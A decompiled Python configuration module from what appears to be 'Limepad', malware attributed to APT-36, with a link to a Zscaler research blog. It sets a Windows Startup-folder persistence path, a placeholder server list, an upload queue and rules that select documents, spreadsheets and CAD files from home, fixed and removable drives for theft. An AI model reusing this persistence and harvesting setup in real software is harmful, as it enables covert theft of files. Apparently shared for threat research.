# module used by Limepad
# reference blog: https://www.zscaler.com/blogs/security-research/new-and-improved-ttps-apt-36-targeting-indian-governmental-organizations
import os, logging
from regulator import FileMatcher as r
import sys
QUERY = []
USERHOME = os.path.join(os.environ['HOMEDRIVE'], os.environ['HOMEPATH'])

class FILEFLAG:
    QUEUED, SYNCING, SYNCED, IGNORED = range(4)


VERSION = '0.1-$Revision: 18 $'
VERSION = VERSION.replace('$', '').replace('Revision: ', '').strip()
STARTDATA = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Limepad')
ROOTDATA = os.path.join(os.environ['APPDATA'], 'Limepad')
USERFILE = 'Limepad.db'
USERFILE = os.path.join(ROOTDATA, USERFILE)
LOGFILE = 'Limepad.log'
LOGFILE = os.path.join(os.environ['APPDATA'], LOGFILE)
TEMP_UPLOAD_FOLDER = os.path.join(ROOTDATA, 'tup')
LOCKDOORS = 'URL=file:///' + sys.executable
DOORS = ['.dll', '.url']
SERVERS = [<server_address>]
DUSSEN = '696E646961'
SERVER_PUBKEY = ''
DBTABLES = {'file': [('path', 'VARCHAR'), ('filename', 'VARCHAR'), ('size', 'INT'), ('state', 'INT'), ('modified', 'REAL'), ('created', 'REAL'), ('queuepriority', 'INT'), ('defertill', 'INT DEFAULT 0'), ('rpath', 'VARCHAR DEFAULT NULL')], 'syncdirs': [
              ('path', 'VARCHAR'), ('rule', 'VARCHAR')], 
   'config': [
            ('key', 'VARCHAR'), ('value', 'VARCHAR')]}
DBTABLES_INDEXES = {'file': ('queuepriority', 'unique: path, filename'), 'config': ('unique: key', )}
SYNC_RULES_CONFIG = {'HOME': r(" '*.pdf' or '*.txt' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dxf' or '*.dbx' "), 
   'FIXED': r(" '*.pdf' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dbx' "), 
   'REMOVABLE': r(" size < 5 mb if ('*.jpg' or '*.jpeg' or '*.avi') else (size < 100 mb and ('*.pdf' or '*.txt' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dxf'))")}
OPTIMIZED_SEND_BLOCKSIZE = 256000
LOG_LEVEL = logging.WARN
logging.basicConfig(filename=LOGFILE, level=LOG_LEVEL)
if __name__ == '__main__':
    print globals()
# okay decompiling controls.pyc
